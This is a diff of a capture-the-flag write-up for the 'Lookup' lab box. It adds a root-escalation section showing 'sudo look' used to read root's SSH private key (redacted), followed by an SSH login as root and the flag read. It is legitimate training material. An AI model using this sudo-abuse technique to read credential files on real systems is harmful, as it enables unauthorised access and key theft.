@@ -223,7 +223,7 @@ bash: no job control in this shell
 www-data@ip-10-80-133-47:/var/www/files.lookup.thm/public_html$ 
 ```
 
-## Exploitation
+## Exploitation User
 https://0xffsec.com/handbook/shells/full-tty/
 rev-shell have limited interactive capabilities, becouse of that we can upgrate it like that:
 
@@ -367,5 +367,74 @@ think@ip-10-80-132-187:/tmp$ cd
 think@ip-10-80-132-187:~$ ls
 user.txt
 think@ip-10-80-132-187:~$ cat user.txt 
+XXX
+```
+## Exploitation Root
+
+```
+think@ip-10-80-132-187:~$ sudo look '' /root/.ssh/id_rsa
+[sudo] password for think: 
+-----BEGIN OPENSSH PRIVATE KEY-----
+XXX
+-----END OPENSSH PRIVATE KEY-----
+```
+
+```
+[ Oguri ~/Desktop/CTF/Lookup ]$ nano ssh_key
+[ Oguri ~/Desktop/CTF/Lookup ]$ chmod 600 ssh_key 
+[ Oguri ~/Desktop/CTF/Lookup ]$ ssh -i ssh_key root@lookup.thm
+The authenticity of host 'lookup.thm (10.80.132.187)' can't be established.
+ED25519 key fingerprint is: SHA256:j34xjEjF7l7I+iQ5YghxUopIX47lJPRPDm5qec7dkvo
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'lookup.thm' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri 28 Nov 2025 01:43:39 PM UTC
+
+  System load:  0.0               Processes:             128
+  Usage of /:   63.5% of 9.75GB   Users logged in:       0
+  Memory usage: 26%               IPv4 address for ens5: 10.80.132.187
+  Swap usage:   0%
+
+ * Ubuntu 20.04 LTS Focal Fossa will reach its end of standard support on 31 May
+ 
+   For more details see:
+   https://ubuntu.com/20-04
+
+Expanded Security Maintenance for Infrastructure is not enabled.
+
+221 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Infra to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+
+Last login: Wed May 28 19:30:26 2025 from 10.23.8.228
+root@ip-10-80-132-187:~# ls
+total 52K
+drwx------  6 root root 4.0K May 28  2025 .
+drwxr-xr-x 19 root root 4.0K Nov 28 12:54 ..
+lrwxrwxrwx  1 root root    9 Jun  2  2023 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3.2K May 12  2024 .bashrc
+drwx------  2 root root 4.0K Jan 11  2024 .cache
+-rwxrwx---  1 root root   66 Jan 11  2024 cleanup.sh
+drwx------  3 root root 4.0K Apr 17  2024 .config
+drwxr-xr-x  3 root root 4.0K Jun 21  2023 .local
+-rw-r--r--  1 root root  161 Jan 11  2024 .profile
+-rw-r-----  1 root root   33 Jan 11  2024 root.txt
+lrwxrwxrwx  1 root root    9 Jul 31  2023 .selected_editor -> /dev/null
+drwx------  2 root root 4.0K May 28  2025 .ssh
+-rw-rw-rw-  1 root root  11K May 28  2025 .viminfo
+root@ip-10-80-132-187:~# cat root.txt 
 XXX
 ```
